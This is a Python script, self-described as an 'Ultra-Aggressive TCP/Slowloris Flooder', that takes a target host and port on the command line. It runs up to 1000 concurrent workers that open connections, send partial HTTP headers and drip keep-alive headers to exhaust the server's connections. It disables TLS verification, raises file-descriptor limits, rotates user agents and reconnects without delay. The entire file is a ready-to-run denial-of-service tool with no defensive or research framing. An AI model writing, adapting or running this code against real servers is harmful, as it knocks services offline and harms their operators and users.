import asyncio
import random
import time
import argparse
import sys
import socket
import ssl

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
]

async def slowloris_worker(host, port, use_ssl, stats):
    """
    Combines Slowloris (holding connections) with high-frequency TCP hits.
    Zero-Delay Passive-Aggressive Mode.
    """
    while True:
        try:
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.open_connection(host, port, ssl=context)
            else:
                reader, writer = await asyncio.open_connection(host, port)
            
            stats['active_conns'] += 1
            stats['total_hits'] += 1
            
            # Send initial incomplete request headers one by one
            writer.write(f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\n".encode())
            writer.write(f"Host: {host}\r\n".encode())
            writer.write(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            writer.write(b"Accept-Language: en-US,en;q=0.5\r\n")
            writer.write(b"Connection: keep-alive\r\n")
            await writer.drain()

            # Passive-Aggressive connection holding
            while True:
                # Keep connection alive by sending random headers periodically
                await asyncio.sleep(random.uniform(5, 15))
                writer.write(f"X-Keep-Alive: {random.randint(1, 9999)}\r\n".encode())
                await writer.drain()
                stats['total_hits'] += 1
                
        except (asyncio.CancelledError, KeyboardInterrupt):
            break
        except Exception:
            stats['errors'] += 1
        finally:
            if 'writer' in locals():
                try:
                    stats['active_conns'] -= 1
                    writer.close()
                    # We don't wait for closed to speed up recycling
                except:
                    pass
            # Zero-delay reconnection for maximum flood
            pass

async def monitor(stats, target_label):
    start_time = time.time()
    while True:
        elapsed = time.time() - start_time
        if elapsed > 0:
            cps = stats['total_hits'] / elapsed
            print(f"[{target_label}] Active: {stats['active_conns']} | Hits: {stats['total_hits']} | CPS: {cps:.2f} | Errors: {stats['errors']}", flush=True)
        await asyncio.sleep(2)

async def main():
    parser = argparse.ArgumentParser(description="Ultra-Aggressive TCP/Slowloris Flooder")
    parser.add_argument("host", help="Target Host")
    parser.add_argument("-p", "--port", type=int, default=443, help="Port")
    parser.add_argument("-c", "--concurrency", type=int, default=1000, help="Workers")
    parser.add_argument("--no-ssl", action="store_true", help="Disable SSL")
    args = parser.parse_args()

    stats = {'active_conns': 0, 'total_hits': 0, 'errors': 0}
    use_ssl = not args.no_ssl if args.port == 443 else False

    print(f"[INFO] Starting Ultra TCP Flood on {args.host}:{args.port} ({args.concurrency} workers)")

    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (1000000, 1000000))
    except:
        pass

    workers = [asyncio.create_task(slowloris_worker(args.host, args.port, use_ssl, stats)) for _ in range(args.concurrency)]
    monitor_task = asyncio.create_task(monitor(stats, args.host))

    try:
        await asyncio.gather(*workers)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
